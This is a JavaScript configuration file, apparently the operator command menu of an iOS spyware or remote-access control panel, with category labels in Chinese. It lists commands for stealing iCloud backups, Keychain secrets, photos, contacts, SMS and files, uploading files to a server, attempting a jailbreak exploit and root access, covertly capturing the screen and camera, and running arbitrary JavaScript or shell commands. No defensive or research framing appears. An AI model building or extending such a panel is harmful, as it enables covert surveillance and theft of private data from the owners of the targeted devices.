export const commandTemplates = [
  {
    category: "信息收集",
    icon: "InfoFilled",
    commands: [
      { name: "获取系统信息", command: "system.info", description: "获取设备型号、iOS版本等基础信息" },
      { name: "获取网络信息", command: "network.info", description: "获取IP地址、网络配置" },
      { name: "获取进程列表", command: "process.list", description: "获取当前运行进程" },
      { name: "获取应用列表", command: "app.list", description: "获取已安装应用" }
    ]
  },
  {
    category: "数据窃取",
    icon: "Key",
    commands: [
      { name: "窃取iCloud数据", command: "exfil.icloud", description: "窃取iCloud备份数据" },
      { name: "窃取Keychain", command: "exfil.keychain", description: "窃取密钥链数据" },
      { name: "窃取照片", command: "exfil.photos", description: "窃取设备照片" },
      { name: "窃取文件", command: "exfil.files", description: "窃取指定目录文件" },
      { name: "窃取通讯录", command: "exfil.contacts", description: "窃取通讯录数据" },
      { name: "窃取短信", command: "exfil.sms", description: "窃取短信记录" }
    ]
  },
  {
    category: "文件操作",
    icon: "FolderOpened",
    commands: [
      { name: "列出目录", command: "fs.list /", description: "列出文件系统目录" },
      { name: "读取文件", command: "fs.read /path/to/file", description: "读取指定文件内容" },
      { name: "上传文件", command: "fs.upload /path/to/file", description: "上传文件到服务器" }
    ]
  },
  {
    category: "权限提升",
    icon: "Lock",
    commands: [
      { name: "检查越狱状态", command: "jailbreak.check", description: "检查设备越狱状态" },
      { name: "尝试越狱", command: "jailbreak.exploit", description: "尝试利用漏洞越狱" },
      { name: "获取root权限", command: "privilege.root", description: "获取root权限" }
    ]
  },
  {
    category: "远程控制",
    icon: "Monitor",
    commands: [
      { name: "截图", command: "screenshot.take", description: "截取设备屏幕" },
      { name: "获取摄像头", command: "camera.capture", description: "获取摄像头画面" }
    ]
  },
  {
    category: "自定义执行",
    icon: "Edit",
    commands: [
      { name: "执行JavaScript", command: "js.eval ", description: "执行自定义JavaScript代码" },
      { name: "执行Shell命令", command: "shell.exec ", description: "执行Shell命令（需越狱）" }
    ]
  }
]
